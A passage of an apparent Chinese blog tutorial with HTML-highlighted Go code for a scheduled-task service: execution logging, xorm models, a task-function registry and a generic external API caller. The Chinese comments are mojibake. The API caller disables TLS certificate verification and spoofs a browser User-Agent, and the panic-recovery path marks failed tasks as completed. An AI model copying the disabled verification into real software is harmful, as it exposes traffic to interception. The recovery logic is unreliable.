	log := &amp;model.TaskExecutionLog{
		TaskID:    taskID,
		StartTime: time.Now(),
		Status:    <span class="hljs-string">"running"</span>,
		Message:   <span class="hljs-string">""</span>,
	}
	global.GVA_DB.Insert(log)

	<span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
	startTime := time.Now()
	<span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
		<span class="hljs-keyword">if</span> r := <span class="hljs-built_in">recover</span>(); r != <span class="hljs-literal">nil</span> {
			<span class="hljs-comment">// ä»»åŠ¡æ‰§è¡Œå¤±è´¥</span>
			endTime := time.Now()
			log.EndTime = endTime
			log.Status = <span class="hljs-string">"failed"</span>
			log.Message = fmt.Sprintf(<span class="hljs-string">"ä»»åŠ¡æ‰§è¡Œå¤±è´¥: %v"</span>, r)
			log.ExecutionTime = endTime.Sub(startTime).Milliseconds()
			_, err = global.GVA_DB.Exec(<span class="hljs-string">"UPDATE task_execution_logs SET end_time = ?, status = ?, message = ?, execution_time = ? WHERE id = ?"</span>, log.EndTime, log.Status, log.Message, log.ExecutionTime, log.ID)
			<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
				global.GVA_LOG.Error(<span class="hljs-string">"æ›´æ–°ä»»åŠ¡æ‰§è¡Œå¤±è´¥æ—¥å¿—å¤±è´¥"</span>, zap.Error(err), zap.Int64(<span class="hljs-string">"log_id"</span>, log.ID))
			}

			<span class="hljs-comment">// æ›´æ–°ä»»åŠ¡çŠ¶æ€</span>
			task.Status = <span class="hljs-string">"completed"</span>
			task.ExecuteCount++
			task.UpdateTime = endTime
			_, err = global.GVA_DB.Exec(<span class="hljs-string">"UPDATE tasks SET status = ?, execute_count = execute_count + 1, update_time = ? WHERE id = ?"</span>, task.Status, task.UpdateTime, taskID)
			<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
				global.GVA_LOG.Error(<span class="hljs-string">"æ›´æ–°ä»»åŠ¡çŠ¶æ€ä¸ºå®Œæˆå¤±è´¥"</span>, zap.Error(err), zap.Int64(<span class="hljs-string">"task_id"</span>, taskID))
			}
		}
	}()

	<span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡å‡½æ•°</span>
	taskFunc(fmt.Sprintf(<span class="hljs-string">"%d"</span>, taskID))

	<span class="hljs-comment">// ä»»åŠ¡æ‰§è¡ŒæˆåŠŸ</span>
	endTime := time.Now()
	log.EndTime = endTime
	log.Status = <span class="hljs-string">"success"</span>
	log.Message = <span class="hljs-string">"ä»»åŠ¡æ‰§è¡ŒæˆåŠŸ"</span>
	log.ExecutionTime = endTime.Sub(startTime).Milliseconds()
	_, err = global.GVA_DB.Exec(<span class="hljs-string">"UPDATE task_execution_logs SET end_time = ?, status = ?, message = ?, execution_time = ? WHERE id = ?"</span>, log.EndTime, log.Status, log.Message, log.ExecutionTime, log.ID)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		global.GVA_LOG.Error(<span class="hljs-string">"æ›´æ–°ä»»åŠ¡æ‰§è¡ŒæˆåŠŸæ—¥å¿—å¤±è´¥"</span>, zap.Error(err), zap.Int64(<span class="hljs-string">"log_id"</span>, log.ID))
	}

	<span class="hljs-comment">// æ›´æ–°ä»»åŠ¡çŠ¶æ€</span>
	task.Status = <span class="hljs-string">"completed"</span>
	task.ExecuteCount++
	task.UpdateTime = endTime

	<span class="hljs-comment">// å¦‚æœæ˜¯ä¸€æ¬¡æ€§ä»»åŠ¡ï¼Œä¸éœ€è¦æ›´æ–°ä¸‹æ¬¡æ‰§è¡Œæ—¶é—´</span>
	<span class="hljs-keyword">if</span> task.Type == <span class="hljs-string">"recurring"</span> {
		<span class="hljs-comment">// è¿™é‡Œå¯ä»¥æ ¹æ®cronè¡¨è¾¾å¼è®¡ç®—ä¸‹æ¬¡æ‰§è¡Œæ—¶é—´</span>
		<span class="hljs-comment">// ä¸ºäº†ç®€åŒ–ï¼Œè¿™é‡Œæš‚æ—¶ä¸å®ç°</span>
	}

	<span class="hljs-comment">// æ›´æ–°ä»»åŠ¡çŠ¶æ€å’Œæ‰§è¡Œæ¬¡æ•°</span>
	result, err := global.GVA_DB.Exec(<span class="hljs-string">"UPDATE tasks SET status = ?, execute_count = execute_count + 1, update_time = ? WHERE id = ?"</span>, task.Status, task.UpdateTime, taskID)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		global.GVA_LOG.Error(<span class="hljs-string">"æ›´æ–°ä»»åŠ¡çŠ¶æ€ä¸ºå®Œæˆå¤±è´¥"</span>, zap.Error(err), zap.Int64(<span class="hljs-string">"task_id"</span>, taskID))
	} <span class="hljs-keyword">else</span> {
		<span class="hljs-comment">// è®°å½•æ›´æ–°ç»“æœ</span>
		rowsAffected, _ := result.RowsAffected()
		global.GVA_LOG.Info(<span class="hljs-string">"æ›´æ–°ä»»åŠ¡çŠ¶æ€æˆåŠŸ"</span>, zap.Int64(<span class="hljs-string">"task_id"</span>, taskID), zap.Int64(<span class="hljs-string">"rows_affected"</span>, rowsAffected))
	}
}
</code></pre>
<h5 data-id="heading-23">2.3 æ•°æ®æ¨¡å‹ (<code>model/task_model.go</code>)</h5>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// Task ä»»åŠ¡æ¨¡å‹</span>
<span class="hljs-keyword">type</span> Task <span class="hljs-keyword">struct</span> {
	ID            <span class="hljs-type">int64</span>     <span class="hljs-string">`xorm:"bigint pk autoincr 'id'" json:"id"`</span>
	Name          <span class="hljs-type">string</span>    <span class="hljs-string">`xorm:"varchar(100) notnull 'name'" json:"name"`</span>
	Description   <span class="hljs-type">string</span>    <span class="hljs-string">`xorm:"text 'description'" json:"description"`</span>
	Type          <span class="hljs-type">string</span>    <span class="hljs-string">`xorm:"varchar(20) notnull 'type'" json:"type"`</span> <span class="hljs-comment">// single, recurring</span>
	CronExpr      <span class="hljs-type">string</span>    <span class="hljs-string">`xorm:"varchar(50) 'cron_expr'" json:"cron_expr"`</span>
	ExecuteAt     time.Time <span class="hljs-string">`xorm:"datetime 'execute_at'" json:"execute_at"`</span>
	Timeout       <span class="hljs-type">int</span>       <span class="hljs-string">`xorm:"int notnull default(30) 'timeout'" json:"timeout"`</span>
	Status        <span class="hljs-type">string</span>    <span class="hljs-string">`xorm:"varchar(20) notnull default('pending') 'status'" json:"status"`</span>
	EnabledStatus <span class="hljs-type">bool</span>      <span class="hljs-string">`xorm:"bool notnull default(true) 'enabled_status'" json:"enabled_status"`</span> <span class="hljs-comment">// æ˜¯å¦å¯ç”¨ï¼ˆç»ˆæ­¢/å¯åŠ¨ï¼‰</span>
	PausedStatus  <span class="hljs-type">bool</span>      <span class="hljs-string">`xorm:"bool notnull default(false) 'paused_status'" json:"paused_status"`</span>  <span class="hljs-comment">// æ˜¯å¦æš‚åœ</span>
	TaskFuncName  <span class="hljs-type">string</span>    <span class="hljs-string">`xorm:"varchar(100) notnull 'task_func_name'" json:"task_func_name"`</span>
	Params        <span class="hljs-type">string</span>    <span class="hljs-string">`xorm:"text 'params'" json:"params"`</span>
	CreateTime    time.Time <span class="hljs-string">`xorm:"datetime notnull 'create_time'" json:"create_time"`</span>
	UpdateTime    time.Time <span class="hljs-string">`xorm:"datetime notnull 'update_time'" json:"update_time"`</span>
	ExecuteCount  <span class="hljs-type">int</span>       <span class="hljs-string">`xorm:"int notnull default(0) 'execute_count'" json:"execute_count"`</span>
	LastExecuteAt time.Time <span class="hljs-string">`xorm:"datetime 'last_execute_at'" json:"last_execute_at"`</span>
	NextExecuteAt time.Time <span class="hljs-string">`xorm:"datetime 'next_execute_at'" json:"next_execute_at"`</span>
}

<span class="hljs-comment">// TaskExecutionLog ä»»åŠ¡æ‰§è¡Œæ—¥å¿—æ¨¡å‹</span>
<span class="hljs-keyword">type</span> TaskExecutionLog <span class="hljs-keyword">struct</span> {
	ID            <span class="hljs-type">int64</span>     <span class="hljs-string">`xorm:"bigint pk autoincr 'id'" json:"id"`</span>
	TaskID        <span class="hljs-type">int64</span>     <span class="hljs-string">`xorm:"bigint notnull 'task_id'" json:"task_id"`</span>
	StartTime     time.Time <span class="hljs-string">`xorm:"datetime notnull" json:"start_time"`</span>
	EndTime       time.Time <span class="hljs-string">`xorm:"datetime" json:"end_time"`</span>
	Status        <span class="hljs-type">string</span>    <span class="hljs-string">`xorm:"varchar(20) notnull" json:"status"`</span> <span class="hljs-comment">// success, failed, timeout</span>
	Message       <span class="hljs-type">string</span>    <span class="hljs-string">`xorm:"text" json:"message"`</span>
	ExecutionTime <span class="hljs-type">int64</span>     <span class="hljs-string">`xorm:"bigint" json:"execution_time"`</span> <span class="hljs-comment">// æ‰§è¡Œæ—¶é—´ï¼ˆæ¯«ç§’ï¼‰</span>
}

<span class="hljs-comment">// CronExpression å®šæ—¶è¡¨è¾¾å¼æ¨¡å‹</span>
<span class="hljs-keyword">type</span> CronExpression <span class="hljs-keyword">struct</span> {
	ID         <span class="hljs-type">int64</span>     <span class="hljs-string">`xorm:"bigint pk autoincr 'id'" json:"id"`</span>
	Label      <span class="hljs-type">string</span>    <span class="hljs-string">`xorm:"varchar(100) notnull 'label'" json:"label"`</span>
	Value      <span class="hljs-type">string</span>    <span class="hljs-string">`xorm:"varchar(50) notnull 'value'" json:"value"`</span>
	CreateTime time.Time <span class="hljs-string">`xorm:"datetime notnull 'create_time'" json:"create_time"`</span>
	UpdateTime time.Time <span class="hljs-string">`xorm:"datetime notnull 'update_time'" json:"update_time"`</span>
}

<span class="hljs-comment">// TableName è®¾ç½®è¡¨å</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(Task)</span></span> TableName() <span class="hljs-type">string</span> {
	<span class="hljs-keyword">return</span> <span class="hljs-string">"tasks"</span>
}

<span class="hljs-comment">// TableName è®¾ç½®è¡¨å</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(TaskExecutionLog)</span></span> TableName() <span class="hljs-type">string</span> {
	<span class="hljs-keyword">return</span> <span class="hljs-string">"task_execution_logs"</span>
}

<span class="hljs-comment">// TableName è®¾ç½®è¡¨å</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(CronExpression)</span></span> TableName() <span class="hljs-type">string</span> {
	<span class="hljs-keyword">return</span> <span class="hljs-string">"cron_expressions"</span>
}

<span class="hljs-comment">// CreateTable åˆ›å»ºè¡¨</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CreateTable</span><span class="hljs-params">(engine *xorm.Engine)</span></span> <span class="hljs-type">error</span> {
	<span class="hljs-comment">// åˆ›å»ºæˆ–æ›´æ–°ä»»åŠ¡æ‰§è¡Œæ—¥å¿—è¡¨</span>
	err := engine.Sync2(&amp;TaskExecutionLog{})
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span> err
	}

	<span class="hljs-comment">// åˆ›å»ºæˆ–æ›´æ–°ä»»åŠ¡è¡¨</span>
	err = engine.Sync2(&amp;Task{})
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span> err
	}

	<span class="hljs-comment">// åˆ›å»ºæˆ–æ›´æ–°å®šæ—¶è¡¨è¾¾å¼è¡¨</span>
	err = engine.Sync2(&amp;CronExpression{})
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span> err
	}

	<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
}
</code></pre>
<h5 data-id="heading-24">2.4 ä»»åŠ¡æœåŠ¡ (<code>service/task_service.go</code>)</h5>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// TaskFuncInfo ä»»åŠ¡å‡½æ•°ä¿¡æ¯ç»“æ„ä½“</span>
<span class="hljs-keyword">type</span> TaskFuncInfo <span class="hljs-keyword">struct</span> {
	Name        <span class="hljs-type">string</span> <span class="hljs-string">`json:"name"`</span>        <span class="hljs-comment">// å‡½æ•°å</span>
	Description <span class="hljs-type">string</span> <span class="hljs-string">`json:"description"`</span> <span class="hljs-comment">// ä¸­æ–‡åŠŸèƒ½åç§°</span>
}

<span class="hljs-comment">// InitTaskFuncMap åˆå§‹åŒ–ä»»åŠ¡å‡½æ•°æ³¨å†Œä¸­å¿ƒ</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitTaskFuncMap</span><span class="hljs-params">()</span></span> {
	<span class="hljs-comment">// æ³¨å†Œå†…ç½®ä»»åŠ¡å‡½æ•°</span>
	TaskFuncMap[<span class="hljs-string">"DataBackup"</span>] = DataBackup
	TaskFuncMap[<span class="hljs-string">"SystemCheck"</span>] = SystemCheck
	TaskFuncMap[<span class="hljs-string">"UserReport"</span>] = UserReport
	TaskFuncMap[<span class="hljs-string">"CleanCache"</span>] = CleanCache
	TaskFuncMap[<span class="hljs-string">"SyncData"</span>] = SyncData
	TaskFuncMap[<span class="hljs-string">"ExecuteExternalAPI"</span>] = ExecuteExternalAPI

	<span class="hljs-comment">// æ³¨å†Œåœºæ™¯ä»»åŠ¡å‡½æ•°</span>
	TaskFuncMap[<span class="hljs-string">"SyncDataFromExternalSystem"</span>] = timer.SyncDataFromExternalSystem
	TaskFuncMap[<span class="hljs-string">"BackupDatabase"</span>] = timer.BackupDatabase
	TaskFuncMap[<span class="hljs-string">"CleanInvalidData"</span>] = timer.CleanInvalidData
	TaskFuncMap[<span class="hljs-string">"AnalyzeBusinessData"</span>] = timer.AnalyzeBusinessData
	TaskFuncMap[<span class="hljs-string">"GenerateDailyReport"</span>] = timer.GenerateDailyReport
	TaskFuncMap[<span class="hljs-string">"SendEmailNotification"</span>] = timer.SendEmailNotification
	TaskFuncMap[<span class="hljs-string">"CheckSystemStatus"</span>] = timer.CheckSystemStatus
	TaskFuncMap[<span class="hljs-string">"TriggerBusinessProcess"</span>] = timer.TriggerBusinessProcess
	TaskFuncMap[<span class="hljs-string">"RotateSystemLogs"</span>] = timer.RotateSystemLogs
	TaskFuncMap[<span class="hljs-string">"RefreshSystemCache"</span>] = timer.RefreshSystemCache
	TaskFuncMap[<span class="hljs-string">"CleanupSystemResources"</span>] = timer.CleanupSystemResources
	TaskFuncMap[<span class="hljs-string">"CollectSystemMetrics"</span>] = timer.CollectSystemMetrics
	TaskFuncMap[<span class="hljs-string">"ExecuteDelayedBusinessTask"</span>] = timer.ExecuteDelayedBusinessTask
	TaskFuncMap[<span class="hljs-string">"ExecuteTemporaryTask"</span>] = timer.ExecuteTemporaryTask
	TaskFuncMap[<span class="hljs-string">"ExecuteEventBasedTask"</span>] = timer.ExecuteEventBasedTask
}

<span class="hljs-comment">// GetTaskFunc è·å–ä»»åŠ¡å‡½æ•°</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetTaskFunc</span><span class="hljs-params">(name <span class="hljs-type">string</span>)</span></span> (<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(<span class="hljs-type">string</span>)</span></span>, <span class="hljs-type">error</span>) {
	task, exists := TaskFuncMap[name]
	<span class="hljs-keyword">if</span> !exists {
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"ä»»åŠ¡å‡½æ•°ä¸å­˜åœ¨: %s"</span>, name)
	}
	<span class="hljs-keyword">return</span> task, <span class="hljs-literal">nil</span>
}

<span class="hljs-comment">// ListTaskFuncs åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„ä»»åŠ¡å‡½æ•°</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ListTaskFuncs</span><span class="hljs-params">()</span></span> []TaskFuncInfo {
	<span class="hljs-keyword">var</span> funcs []TaskFuncInfo
	<span class="hljs-keyword">for</span> name := <span class="hljs-keyword">range</span> TaskFuncMap {
		description := TaskFuncDescriptions[name]
		<span class="hljs-keyword">if</span> description == <span class="hljs-string">""</span> {
			description = name <span class="hljs-comment">// å¦‚æœæ²¡æœ‰æ‰¾åˆ°ä¸­æ–‡æè¿°ï¼Œä½¿ç”¨å‡½æ•°å</span>
		}
		funcs = <span class="hljs-built_in">append</span>(funcs, TaskFuncInfo{
			Name:        name,
			Description: description,
		})
	}
	<span class="hljs-keyword">return</span> funcs
}

<span class="hljs-comment">// ExecuteExternalAPI æ‰§è¡Œå¤–éƒ¨APIè°ƒç”¨çš„ä¸‡èƒ½å‡½æ•°</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ExecuteExternalAPI</span><span class="hljs-params">(taskID <span class="hljs-type">string</span>)</span></span> {
	global.GVA_LOG.Info(<span class="hljs-string">"æ‰§è¡Œå¤–éƒ¨APIè°ƒç”¨ä»»åŠ¡"</span>, zap.String(<span class="hljs-string">"taskID"</span>, taskID))
	fmt.Println(<span class="hljs-string">"æ­£åœ¨æ‰§è¡Œå¤–éƒ¨APIè°ƒç”¨..."</span>)

	<span class="hljs-comment">// ä»æ•°æ®åº“è¯»å–ä»»åŠ¡ä¿¡æ¯</span>
	<span class="hljs-keyword">var</span> task model.Task
	<span class="hljs-comment">// å°†å­—ç¬¦ä¸²ç±»å‹çš„taskIDè½¬æ¢ä¸ºint64ç±»å‹</span>
	taskIDInt, err := strconv.ParseInt(taskID, <span class="hljs-number">10</span>, <span class="hljs-number">64</span>)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		global.GVA_LOG.Error(<span class="hljs-string">"è§£æä»»åŠ¡IDå¤±è´¥"</span>, zap.Error(err), zap.String(<span class="hljs-string">"taskID"</span>, taskID))
		fmt.Printf(<span class="hljs-string">"è§£æä»»åŠ¡IDå¤±è´¥: %v\n"</span>, err)
		<span class="hljs-keyword">return</span>
	}
	<span class="hljs-comment">// ä½¿ç”¨åŸç”ŸSQLè¯­å¥æŸ¥è¯¢ä»»åŠ¡ï¼Œé¿å…XORMç”Ÿæˆå¯èƒ½ä¸å…¼å®¹çš„SQL</span>
	found, err := global.GVA_DB.SQL(<span class="hljs-string">"SELECT * FROM tasks WHERE id = ?"</span>, taskIDInt).Get(&amp;task)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> || !found {
		global.GVA_LOG.Error(<span class="hljs-string">"ä»æ•°æ®åº“è¯»å–ä»»åŠ¡å¤±è´¥"</span>, zap.Error(err), zap.String(<span class="hljs-string">"taskID"</span>, taskID), zap.Bool(<span class="hljs-string">"found"</span>, found))
		fmt.Printf(<span class="hljs-string">"ä»æ•°æ®åº“è¯»å–ä»»åŠ¡å¤±è´¥: %v\n"</span>, err)
		<span class="hljs-keyword">return</span>
	}

	<span class="hljs-comment">// æ£€æŸ¥ä»»åŠ¡å‚æ•°</span>
	paramsJSON := task.Params
	<span class="hljs-keyword">if</span> paramsJSON == <span class="hljs-string">""</span> {
		global.GVA_LOG.Error(<span class="hljs-string">"ä»»åŠ¡å‚æ•°ä¸ºç©º"</span>, zap.String(<span class="hljs-string">"taskID"</span>, taskID))
		fmt.Println(<span class="hljs-string">"ä»»åŠ¡å‚æ•°ä¸ºç©º"</span>)
		<span class="hljs-keyword">return</span>
	}

	<span class="hljs-comment">// è§£æå‚æ•°</span>
	<span class="hljs-keyword">var</span> params ExternalAPICallParams
	err = json.Unmarshal([]<span class="hljs-type">byte</span>(paramsJSON), &amp;params)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		global.GVA_LOG.Error(<span class="hljs-string">"è§£æAPIè°ƒç”¨å‚æ•°å¤±è´¥"</span>, zap.Error(err))
		fmt.Printf(<span class="hljs-string">"è§£æAPIè°ƒç”¨å‚æ•°å¤±è´¥: %v\n"</span>, err)
		<span class="hljs-keyword">return</span>
	}

	<span class="hljs-comment">// ç¡®ä¿ç»“æœç›®å½•å­˜åœ¨</span>
	resultDir := <span class="hljs-string">"external_call_result"</span>
	<span class="hljs-keyword">if</span> err := os.MkdirAll(resultDir, <span class="hljs-number">0755</span>); err != <span class="hljs-literal">nil</span> {
		global.GVA_LOG.Error(<span class="hljs-string">"åˆ›å»ºç»“æœç›®å½•å¤±è´¥"</span>, zap.Error(err))
		fmt.Printf(<span class="hljs-string">"åˆ›å»ºç»“æœç›®å½•å¤±è´¥: %v\n"</span>, err)
		<span class="hljs-keyword">return</span>
	}

	<span class="hljs-comment">// éªŒè¯APIåœ°å€</span>
	<span class="hljs-keyword">if</span> params.APIAddress == <span class="hljs-string">""</span> {
		global.GVA_LOG.Error(<span class="hljs-string">"APIåœ°å€ä¸ºç©º"</span>, zap.String(<span class="hljs-string">"taskID"</span>, taskID))
		fmt.Println(<span class="hljs-string">"APIåœ°å€ä¸ºç©º"</span>)
		<span class="hljs-comment">// ä¿å­˜å¤±è´¥ç»“æœ</span>
		saveResult(resultDir, taskID, <span class="hljs-string">"APIåœ°å€ä¸ºç©º"</span>)
		<span class="hljs-keyword">return</span>
	}

	<span class="hljs-comment">// å»é™¤APIåœ°å€ä¸­çš„åå¼•å·å’Œç©ºæ ¼</span>
	params.APIAddress = strings.Trim(params.APIAddress, <span class="hljs-string">"` "</span>)

	<span class="hljs-comment">// éªŒè¯APIåœ°å€æ˜¯å¦åŒ…å«åè®®æ–¹æ¡ˆ</span>
	<span class="hljs-keyword">if</span> !strings.HasPrefix(params.APIAddress, <span class="hljs-string">"http://"</span>) &amp;&amp; !strings.HasPrefix(params.APIAddress, <span class="hljs-string">"https://"</span>) {
		global.GVA_LOG.Error(<span class="hljs-string">"APIåœ°å€ç¼ºå°‘åè®®æ–¹æ¡ˆ"</span>, zap.String(<span class="hljs-string">"taskID"</span>, taskID), zap.String(<span class="hljs-string">"APIAddress"</span>, params.APIAddress))
		fmt.Printf(<span class="hljs-string">"APIåœ°å€ç¼ºå°‘åè®®æ–¹æ¡ˆ: %s\n"</span>, params.APIAddress)
		<span class="hljs-comment">// ä¿å­˜å¤±è´¥ç»“æœ</span>
		saveResult(resultDir, taskID, fmt.Sprintf(<span class="hljs-string">"APIåœ°å€ç¼ºå°‘åè®®æ–¹æ¡ˆ: %s"</span>, params.APIAddress))
		<span class="hljs-keyword">return</span>
	}

	<span class="hljs-comment">// å°†è¯·æ±‚æ–¹å¼è½¬æ¢ä¸ºå¤§å†™</span>
	params.RequestMethod = strings.ToUpper(params.RequestMethod)

	<span class="hljs-comment">// è¾“å‡ºAPIåœ°å€ä»¥ä¾¿è°ƒè¯•</span>
	global.GVA_LOG.Info(<span class="hljs-string">"æ‰§è¡ŒAPIè°ƒç”¨"</span>, zap.String(<span class="hljs-string">"APIAddress"</span>, params.APIAddress), zap.String(<span class="hljs-string">"RequestMethod"</span>, params.RequestMethod))
	fmt.Printf(<span class="hljs-string">"æ­£åœ¨è°ƒç”¨API: %s\n"</span>, params.APIAddress)
	fmt.Printf(<span class="hljs-string">"è¯·æ±‚æ–¹å¼: %s\n"</span>, params.RequestMethod)

	<span class="hljs-comment">// å‡†å¤‡è¯·æ±‚</span>
	<span class="hljs-comment">// åˆ›å»ºè‡ªå®šä¹‰TLSé…ç½®ï¼Œè·³è¿‡è¯ä¹¦éªŒè¯ï¼ˆä»…ç”¨äºå¼€å‘æµ‹è¯•ç¯å¢ƒï¼‰</span>
	tlsConfig := &amp;tls.Config{
		InsecureSkipVerify: <span class="hljs-literal">true</span>,
	}
	transport := &amp;http.Transport{
		TLSClientConfig: tlsConfig,
	}
	client := &amp;http.Client{
		Timeout:   time.Duration(params.Timeout) * time.Second,
		Transport: transport,
	}

	<span class="hljs-comment">// å‡†å¤‡è¯·æ±‚ä½“</span>
	<span class="hljs-keyword">var</span> body []<span class="hljs-type">byte</span>
	<span class="hljs-keyword">var</span> bodyReader io.Reader
	<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(params.Data) &gt; <span class="hljs-number">0</span> {
		body, err = json.Marshal(params.Data)
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			global.GVA_LOG.Error(<span class="hljs-string">"åºåˆ—åŒ–è¯·æ±‚æ•°æ®å¤±è´¥"</span>, zap.Error(err))
			fmt.Printf(<span class="hljs-string">"åºåˆ—åŒ–è¯·æ±‚æ•°æ®å¤±è´¥: %v\n"</span>, err)
			<span class="hljs-keyword">return</span>
		}
		bodyReader = bytes.NewBuffer(body)
	} <span class="hljs-keyword">else</span> {
		<span class="hljs-comment">// å½“è¯·æ±‚ä½“ä¸ºç©ºæ—¶ï¼Œä½¿ç”¨nil</span>
		bodyReader = <span class="hljs-literal">nil</span>
	}

	<span class="hljs-comment">// åˆ›å»ºè¯·æ±‚</span>
	req, err := http.NewRequest(params.RequestMethod, params.APIAddress, bodyReader)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		global.GVA_LOG.Error(<span class="hljs-string">"åˆ›å»ºHTTPè¯·æ±‚å¤±è´¥"</span>, zap.Error(err))
		fmt.Printf(<span class="hljs-string">"åˆ›å»ºHTTPè¯·æ±‚å¤±è´¥: %v\n"</span>, err)
		<span class="hljs-keyword">return</span>
	}

	<span class="hljs-comment">// è®¾ç½®é»˜è®¤è¯·æ±‚å¤´</span>
	req.Header.Set(<span class="hljs-string">"User-Agent"</span>, <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"</span>)

	<span class="hljs-comment">// è®¾ç½®ç”¨æˆ·æŒ‡å®šçš„è¯·æ±‚å¤´</span>
	<span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> params.Headers {
		req.Header.Set(key, value)
	}

	<span class="hljs-comment">// å‘é€è¯·æ±‚</span>
	resp, err := client.Do(req)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		global.GVA_LOG.Error(<span class="hljs-string">"å‘é€HTTPè¯·æ±‚å¤±è´¥"</span>, zap.Error(err))
		fmt.Printf(<span class="hljs-string">"å‘é€HTTPè¯·æ±‚å¤±è´¥: %v\n"</span>, err)

		<span class="hljs-comment">// ä¿å­˜å¤±è´¥ç»“æœ</span>
		saveResult(resultDir, taskID, fmt.Sprintf(<span class="hljs-string">"è¯·æ±‚å¤±è´¥: %v"</span>, err))
		<span class="hljs-keyword">return</span>
	}
	<span class="hljs-keyword">defer</span> resp.Body.Close()

	<span class="hljs-comment">// è¯»å–å“åº”</span>
	respBody, err := io.ReadAll(resp.Body)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		global.GVA_LOG.Error(<span class="hljs-string">"è¯»å–å“åº”å¤±è´¥"</span>, zap.Error(err))
		fmt.Printf(<span class="hljs-string">"è¯»å–å“åº”å¤±è´¥: %v\n"</span>, err)

		<span class="hljs-comment">// ä¿å­˜å¤±è´¥ç»“æœ</span>
		saveResult(resultDir, taskID, fmt.Sprintf(<span class="hljs-string">"è¯»å–å“åº”å¤±è´¥: %v"</span>, err))
		<span class="hljs-keyword">return</span>
	}

	<span class="hljs-comment">// æ„å»ºç»“æœå­—ç¬¦ä¸²</span>
	responseBodyStr := <span class="hljs-type">string</span>(respBody)
	<span class="hljs-comment">// å°è¯•å°†å“åº”ä½“è§£æä¸ºJSONå¹¶æ ¼å¼åŒ–</span>
	<span class="hljs-keyword">var</span> jsonObj <span class="hljs-keyword">interface</span>{}
	<span class="hljs-keyword">if</span> err := json.Unmarshal(respBody, &amp;jsonObj); err == <span class="hljs-literal">nil</span> {
		<span class="hljs-comment">// å¦‚æœæ˜¯JSONï¼Œæ ¼å¼åŒ–æ˜¾ç¤º</span>
		formattedJSON, err := json.MarshalIndent(jsonObj, <span class="hljs-string">""</span>, <span class="hljs-string">"  "</span>)
		<span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> {
			responseBodyStr = <span class="hljs-type">string</span>(formattedJSON)
		}
	}
	result := fmt.Sprintf(<span class="hljs-string">"çŠ¶æ€ç : %d\nå“åº”ä½“: \n%s"</span>, resp.StatusCode, responseBodyStr)

	<span class="hljs-comment">// ä¿å­˜ç»“æœ</span>
	saveResult(resultDir, taskID, result)

	global.GVA_LOG.Info(<span class="hljs-string">"å¤–éƒ¨APIè°ƒç”¨ä»»åŠ¡æ‰§è¡Œå®Œæˆ"</span>)
	fmt.Println(<span class="hljs-string">"å¤–éƒ¨APIè°ƒç”¨å®Œæˆ"</span>)
}
</code></pre>
<h3 data-id="heading-25">å…­ã€å‰ç«¯html/vue3å„åŠŸèƒ½ä»‹ç»åŠæ ¸å¿ƒæºä»£ç </h3>
<h4 data-id="heading-26">1. æ ¸å¿ƒåŠŸèƒ½ä»‹ç»</h4>
<h5 data-id="heading-27">1.1 ä»»åŠ¡åˆ—è¡¨å±•ç¤º</h5>
<p><strong>åŠŸèƒ½</strong>ï¼šæ˜¾ç¤ºæ‰€æœ‰ä»»åŠ¡çš„åˆ—è¡¨ï¼ŒåŒ…æ‹¬ä»»åŠ¡IDã€åç§°ã€ç±»å‹ã€æ‰§è¡Œé—´éš”ã€æ‰§è¡Œæ¬¡æ•°ã€æ‰§è¡Œç»“æœç­‰ä¿¡æ¯</p>
<p><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š</p>
<ul>
<li>åˆ†é¡µæ˜¾ç¤ºä»»åŠ¡åˆ—è¡¨</li>
<li>ä»»åŠ¡çŠ¶æ€å®æ—¶æ›´æ–°</li>
<li>æ‰§è¡Œç»“æœé¢œè‰²åŒºåˆ†</li>
<li>è¶…æœŸä»»åŠ¡ç‰¹æ®Šæ ‡è®°</li>
<li>ä»»åŠ¡æ“ä½œæŒ‰é’®</li>
</ul>
<h5 data-id="heading-28">1.2 ä»»åŠ¡ç®¡ç†æ“ä½œ</h5>
